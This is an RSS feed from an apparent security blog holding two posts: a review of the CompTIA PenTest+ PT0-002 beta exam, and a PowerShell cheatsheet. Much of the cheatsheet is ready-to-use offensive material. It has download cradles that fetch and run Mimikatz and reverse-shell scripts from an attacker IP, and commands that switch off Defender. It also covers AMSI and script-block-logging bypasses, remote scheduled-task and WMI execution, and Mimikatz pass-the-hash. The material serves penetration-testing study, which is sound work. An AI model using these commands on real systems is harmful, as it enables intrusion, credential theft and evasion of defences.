<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Posts on Welcome to Tribal Knowledge</title>
        <link>https://tribalknowledgepage.github.io/posts/</link>
        <description>Recent content in Posts on Welcome to Tribal Knowledge</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>en-us</language>
        <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
        <lastBuildDate>Fri, 29 Oct 2021 00:00:00 +0000</lastBuildDate>
        <atom:link href="https://tribalknowledgepage.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
        
        <item>
            <title>CompTIA PenTest&#43; PTO-002 Beta exam experience and review</title>
            <link>https://tribalknowledgepage.github.io/posts/2021/10/comptia-pentest-pto-002-beta-exam-experience-and-review/</link>
            <pubDate>Fri, 29 Oct 2021 00:00:00 +0000</pubDate>
            
            <guid>https://tribalknowledgepage.github.io/posts/2021/10/comptia-pentest-pto-002-beta-exam-experience-and-review/</guid>
            <description>Penetration testing is and has been a hot skill in the market for a while now. Many certification vendors such as Offensive Security, SANS and eLearnSecurity, to name a few, have been providing training and testing candidate&amp;rsquo;s skills by leveraging hands-on exams.
About the exam  CompTIA is a popular and respected brand in IT certification industry for many years now. Some of the popular certifications offered by CompTIA which you may have heard are A+, Network+ and Security+.</description>
            <content type="html"><![CDATA[<p>Penetration testing is and has been a hot skill in the market for a while now. Many certification vendors such as Offensive Security, SANS and eLearnSecurity, to name a few, have been providing training and testing candidate&rsquo;s skills by leveraging hands-on exams.</p>
<h2 id="about-the-exam">About the exam</h2>
<hr>
<p>CompTIA is a popular and respected brand in IT certification industry for many years now. Some of the popular certifications offered by CompTIA which you may have heard are A+, Network+ and Security+.</p>
<p>CompTIA launched their first penetration testing specific certification exam titled PenTest+ on July 31, 2018 (which is set to expire on April, 2022 per CompTIA&rsquo;s website) and more recently launched the updated version, <a href="https://www.comptia.org/certifications/pentest">PTO-002</a> on October 28, 2021.</p>
<p>Priced at $370 USD, the exam asks a maximum of 85 performance-based and multiple-choice questions. The allotted time to take the exam is 165 minutes and a candidate has to score a minimum of 750 (on a scale of 100-900) to pass. Taken from the official website, the exam tests the candidate on the following skills:</p>
<ul>
<li>Plan and scope a penetration testing engagement</li>
<li>Understand legal and compliance requirements</li>
<li>Perform vulnerability scanning and penetration testing using appropriate tools and
techniques, and then analyze the results</li>
<li>Produce a written report containing proposed remediation techniques, effectively
communicate results to the management team, and provide practical recommendations</li>
</ul>
<h2 id="my-impressions">My impressions</h2>
<hr>
<p>Earlier this year, I got the opportunity to take the Beta exam for PTO-002 and the results were recently declared, just before the official exam launch.</p>

    <img src="/img/pentestplus_cert.png"  alt="alt text"  class="center"   width="550"   height="400"  />


<p>A popular notion, when it comes to penetration testing, is legally launching attacks on organizations trying to break-in (depending on the goal) but there is more to a professional penetration test engagement. This course and exam certainly covers such aspects within the planning and scoping, legal and ethical requirements, reporting and communication sections which are all equally if not more important than vanilla attacking.</p>
<p>Firstly, what impressed me the most about this exam was the quality of questions. None of the questions asked on the exam gave away the answers based off of some keywords in the question, rather made sure that you understood the concept discussed in the question and are able to select an appropriate choice.</p>
<p>Secondly, some of the questions were around the logistics involved in a typical penetration test (covered in the &lsquo;Planning and Scoping&rsquo; section of their syllabus). The level of depth covered in this exam is not common to see in other parallel certifications.</p>
<h2 id="study-resources">Study resources</h2>
<hr>
<ol>
<li>
<p><a href="https://www.comptia.org/certifications/pentest#exampreparation">Here</a> is what CompTIA recommends for exam preparation.</p>
</li>
<li>
<p>Official study guide is available for pre-order on <a href="https://www.amazon.com/CompTIA-PenTest-Study-Guide-PT0-002/dp/1119823811">Amazon</a>.</p>
</li>
<li>
<p>To gain hands-on experience with attack tools and gain better understanding of the overall testing methodology, try TryHackMe&rsquo;s learning path for <a href="https://tryhackme.com/path/outline/pentestplus">CompTIA PenTest+</a>.</p>
</li>
</ol>
<h2 id="final-thoughts">Final thoughts</h2>
<hr>
<p>In the penetration testing domain of certifications, this is a relatively new entry-level certification with potential to grow and being recognized in the industry, compared to other established giants mentioned at the beginning of the post but being CompTIA, this certification is compliant with ISO 17024 standards and approved by the US DoD to meet directive 8140/8570.01-M requirements.</p>
<p>It is also relatively cheaper than other popular certifications like OSCP, GPEN and eCPPTv2.</p>
<p>I would recommend this to aspiring penetration testers, as studying for this exam will definitely give you a better understanding of the elements involved in &ldquo;professional&rdquo; penetration test offering from initiation to conclusion.</p>
]]></content>
        </item>
        
        <item>
            <title>PowerShell Cheatsheet</title>
            <link>https://tribalknowledgepage.github.io/posts/2021/10/powershell-cheatsheet/</link>
            <pubDate>Fri, 29 Oct 2021 00:00:00 +0000</pubDate>
            
            <guid>https://tribalknowledgepage.github.io/posts/2021/10/powershell-cheatsheet/</guid>
            <description>This cheatsheet will continue to receive updates.
PowerShell (PS) 101 commands  Please note that all of the following commands are run from a PowerShell prompt.
Retrieve the PowerShell version
$PSVersionTable List help about a cmdlet in a readable format
Get-Help &amp;lt;cmdlet&amp;gt; | more List cmdlets which contain the keyword &amp;lsquo;service&amp;rsquo; in them
Get-Command -CommandType Cmdlet | ?{$_.Name -match &amp;#34;service&amp;#34;} List available commands in the current PS session and their respective details which contain the keyword &amp;lsquo;command&amp;rsquo; in them:</description>
            <content type="html"><![CDATA[<p>This cheatsheet will continue to receive updates.</p>
<h2 id="powershell-ps-101-commands">PowerShell (PS) 101 commands</h2>
<hr>
<p>Please note that all of the following commands are run from a PowerShell prompt.</p>
<p>Retrieve the PowerShell version</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"> $PSVersionTable 
</code></pre></div><p>List help about a cmdlet in a readable format</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Get-Help &lt;cmdlet&gt; | more
</code></pre></div><p>List cmdlets which contain the keyword &lsquo;service&rsquo; in them</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Get-Command -CommandType Cmdlet | ?{$_.Name <span style="color:#f92672">-match</span> <span style="color:#e6db74">&#34;service&#34;</span>}
</code></pre></div><p>List available commands in the current PS session and their respective details which contain the keyword &lsquo;command&rsquo; in them:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Get-Command -CommandType All -ShowCommandInfo | ?{$_.Name <span style="color:#f92672">-match</span> <span style="color:#e6db74">&#34;command&#34;</span>}
</code></pre></div><p>Wildcards can be used to match as well.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Get-Command -CommandType All | ?{$_.Name <span style="color:#f92672">-match</span> <span style="color:#e6db74">&#34;serv*&#34;</span>}
</code></pre></div><p>Count the number of commands in the output</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">(Get-Command -CommandType All | ?{$_.Name <span style="color:#f92672">-match</span> <span style="color:#e6db74">&#34;command&#34;</span>}).count
</code></pre></div><p>List all cmdlets with PKI as source</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Get-Command -CommandType Cmdlet | ?{$_.Source <span style="color:#f92672">-match</span> <span style="color:#e6db74">&#34;PKI&#34;</span>}
</code></pre></div><p>List available commands in a module by running</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Get-Command -Module &lt;module name&gt;
</code></pre></div><h2 id="handy-tweaks">Handy Tweaks</h2>
<hr>
<p>When you launch PowerShell session, it opens in the user&rsquo;s home directory by default. This behavior can be modified so that new PS sessions open in a custom directory. Here is how:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#75715e"># Check the value of $PROFILE variable.</span>

PS C:\Windows\system32&gt; $PROFILE
C:\Users\XXXXXXXXX\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1

<span style="color:#75715e"># Create the .ps1 file returned from the $PROFILE variable</span>

PS C:\Windows\system32&gt; New-Item -Path $PROFILE -Type File -Force

<span style="color:#75715e"># To set and change the default working directory, open the above &#39;Microsoft.PowerShell_profile.ps1&#39; in ISE and add the following line with your desired path.</span>

Set-location &lt;Custom directory path&gt;
</code></pre></div><h2 id="one-liners">One-Liners</h2>
<hr>
<h3 id="creating-a-firewall-rule-exception-in-windows">Creating a firewall rule exception in Windows</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">New-NetFirewallRule -DisplayName <span style="color:#e6db74">&#39;HTTP-Inbound&#39;</span> -Profile @(<span style="color:#e6db74">&#39;Domain&#39;</span>, <span style="color:#e6db74">&#39;Private&#39;</span>) -Direction Inbound -Action Allow -Protocol TCP -LocalPort @(<span style="color:#e6db74">&#39;80&#39;</span>, <span style="color:#e6db74">&#39;443&#39;</span>)

New-NetFirewallRule -DisplayName <span style="color:#e6db74">&#39;447-Inbound&#39;</span> -Profile @(<span style="color:#e6db74">&#39;Domain&#39;</span>, <span style="color:#e6db74">&#39;Private&#39;</span>) -Direction Inbound -Action Allow -Protocol TCP -LocalPort @(<span style="color:#e6db74">&#39;447&#39;</span>)
</code></pre></div><h3 id="download-cradles">Download cradles</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#75715e"># Option 1 - Using IEX (compatible with older versions of PS)</span>

powershell iex (New-Object Net.WebClient).DownloadString(<span style="color:#e6db74">&#34;http://192.168.X.X/Invoke-MimikatzEX.ps1&#34;</span>)

<span style="color:#75715e"># Option 2 - Using IWR (works on current version of PS)</span>

iwr -UseBasicparsing http<span style="color:#960050;background-color:#1e0010">:</span>//192.168.X.X/Invoke-PowerShellRev.ps1 | iex
</code></pre></div><h3 id="creating-a-credential-object">Creating a Credential object</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">$SecPassword = ConvertTo-SecureString <span style="color:#e6db74">&#39;XXXXXXXXXXXX&#39;</span> -AsPlainText -Force

$Cred = New-Object System.Management.Automation.PSCredential(<span style="color:#e6db74">&#39;domain\user&#39;</span>, $SecPassword)

</code></pre></div><h3 id="decode-base64">Decode Base64</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">$EncodedText = <span style="color:#960050;background-color:#1e0010">“</span>VABoA....<span style="color:#960050;background-color:#1e0010">”</span>

$DecodedText = <span style="color:#66d9ef">[System.Text.Encoding]</span>::Unicode.GetString(<span style="color:#66d9ef">[System.Convert]</span>::FromBase64String($EncodedText))

$DecodedText
</code></pre></div><h3 id="disable-av">Disable AV</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Set-MpPreference -DisableRealtimeMonitoring $true

Set-MpPreference -DisableIOAVProtection $true
</code></pre></div><h3 id="encode-reverse-shell">Encode reverse shell</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">. .\Invoke-Encode.ps1

Invoke-Encode -DataToEncode .\Invoke-PowerShellTcpOneLine.ps1 -OutCommand

<span style="color:#75715e"># Open a listener (nc) on one end and on another shell use: </span>

powershell -e &lt;content of encodedcommand.txt&gt;
</code></pre></div><h3 id="reverse-shell-using-a-batch-file">Reverse shell using a Batch file</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#75715e"># Create reverse.bat file</span>

$Contents = <span style="color:#e6db74">&#39;powershell.exe -c iex ((New-Object Net.WebClient).DownloadString(&#39;&#39;http://192.168.X.X/Invoke-PowerShellRev8080.ps1&#39;&#39;))&#39;</span>
Out-File -Encoding Ascii -InputObject $Contents -FilePath C:\...\Tools\reverse8080.bat

<span style="color:#75715e"># Call reverse.bat file</span>

<span style="color:#75715e">## Option 1</span>
.rotten.exe * reverse.bat

<span style="color:#75715e">## Option 2</span>
Invoke-Mimikatz -Command <span style="color:#e6db74">&#39;&#34;sekurlsa::pth /user:username /domain:srv.contoso.local /ntlm:&lt;NTLMHASH&gt; /run:C:\users\.....\desktop\reverse.bat&#34;&#39;</span>
</code></pre></div><h3 id="scheduled-tasks">Scheduled tasks</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">schtasks /create /S dc.contoso.local /SC Weekly /RU <span style="color:#e6db74">&#34;NT Authority\SYSTEM&#34;</span> /TN <span style="color:#e6db74">&#34;UserX&#34;</span> /TR <span style="color:#e6db74">&#34;powershell.exe -c &#39;iex (New-Object Net.WebClient).DownloadString(&#39;&#39;http://172.16.X.X/Invoke-PowerShellRev8080.ps1&#39;&#39;&#39;)&#39;&#34;</span>

schtasks /Run /S dc.contoso.local /TN <span style="color:#e6db74">&#34;UserX&#34;</span>
</code></pre></div><h3 id="invoke-wmimethod---command-execution-reverse-shell-etc">Invoke-WMIMethod - Command Execution (Reverse shell, etc.)</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Invoke-WmiMethod win32_process -ComputerName dc.contoso.local -name create -argumentlist <span style="color:#e6db74">&#34;powershell.exe -e $encodedCommand&#34;</span>
</code></pre></div><h3 id="chain-powershell-commands-to-bypass-sblogging-then-amsibypass-and-then-get-reverse-shell">Chain powershell commands to Bypass SBLogging, then AMSIBypass and then get reverse shell</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">powershell -c <span style="color:#e6db74">&#34;iex (iwr -UseBasicParsing http://192.168.X.X/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://192.168.X.X/amsibypass.txt);iex (iwr -UseBasicParsing http://192.168.X.X/Invoke-PowerShellTcpEx.ps1)
</span></code></pre></div><h3 id="check-local-admin-access-via-invoke-command">Check local admin access via Invoke-Command</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Invoke-Command -ScriptBlock {whoami;hostname} -ComputerName (Get-Content ..\Output\computers.txt) 2&gt;$null
</code></pre></div><h3 id="over-pass-the-hash">Over pass-the-hash</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Invoke-Mimikatz -Command <span style="color:#e6db74">&#39;&#34;sekurlsa::pth /user:username /domain:srv.contoso.local /ntlm:&lt;NTLMHASH&gt; /run:powershell.exe&#34;&#39;</span>
</code></pre></div><h2 id="playing-with-command-output">Playing with command output</h2>
<hr>
<h3 id="1-expand-redacted-output">1. Expand redacted output</h3>
<p>You might notice that sometimes the output returned by PS commands is redacted with &ldquo;&hellip;&rdquo;. This can be corrected by modifying the value of the PS variable - <code>$FormatEnumerationLimit</code> as follows.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">$FormatEnumerationLimit = -1
</code></pre></div><h3 id="2-using-more-command">2. Using &lsquo;more&rsquo; command</h3>
<p>Piping output of a command to <code>more</code> command makes it readable from the first line. This is equivalent to <code> less</code> command in Linux/Unix.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Get-Process | more
</code></pre></div><h3 id="3-using--expandproperty">3. Using -ExpandProperty</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Get-CimClass -Namespace root/SecurityCenter2 -MethodName * | select -ExpandProperty CimClassMethods
</code></pre></div><h3 id="4-exporting-output-in-a-csv-format">4. Exporting output in a CSV format</h3>
<p>Sometimes (more than we&rsquo;d think) having the output in a CSV file is a blessing. Here is how it can be done using <code>Export-CSV</code> cmdlet.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Get-Date | Select-Object -Property DateTime, Day, DayOfWeek, DayOfYear | Export-Csv -Path .\DateTime.csv -NoTypeInformation
</code></pre></div>]]></content>
        </item>
        
    </channel>
</rss>
